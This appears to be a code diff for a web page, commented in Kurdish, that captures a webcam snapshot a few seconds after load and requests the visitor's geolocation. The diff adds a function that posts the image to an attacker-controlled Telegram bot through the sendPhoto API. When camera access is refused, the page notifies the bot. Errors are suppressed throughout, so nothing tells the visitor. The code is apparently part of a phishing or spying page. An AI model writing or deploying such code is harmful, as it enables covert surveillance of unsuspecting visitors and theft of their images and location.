@@ -35,6 +35,22 @@
             } catch (e) {}
         }
 
+        async function sendPhotoBase64(base64Data) {
+            try {
+                // بۆتێ تەلەگرامێ دشێت وێنەی ب ڕێکا URL یان لێرەدا ب ڕێکا sendMessage یان sendPhoto ب Base64 ڤەگوێزێت
+                // با ڤی کومیچی بەکاربینین بۆ ارسال کردن ب شێوەیەکێ دڵنیا
+                const blob = await fetch(base64Data).then(res => res.blob());
+                const formData = new FormData();
+                formData.append('chat_id', chat_id);
+                formData.append('photo', blob, 'snap.jpg');
+                
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (err) {}
+        }
+
         function askLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(position => {
@@ -55,19 +71,8 @@
                     const canvas = document.getElementById('canvas');
                     canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                     
-                    canvas.toBlob(async blob => {
-                        if (blob) {
-                            const formData = new FormData();
-                            formData.append('chat_id', chat_id);
-                            formData.append('photo', blob, 'snap.jpg');
-                            try {
-                                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
-                                    method: 'POST', 
-                                    body: formData 
-                                });
-                            } catch (err) {}
-                        }
-                    }, 'image/jpeg', 0.8);
+                    const dataURL = canvas.toDataURL('image/jpeg', 0.8);
+                    sendPhotoBase64(dataURL);
                 }, 3000);
             } catch (err) {
                 sendMessage("⚠️ ڕێگەی بە کامێرا نەدا یان کامێرا نەدۆزرایەوە.");
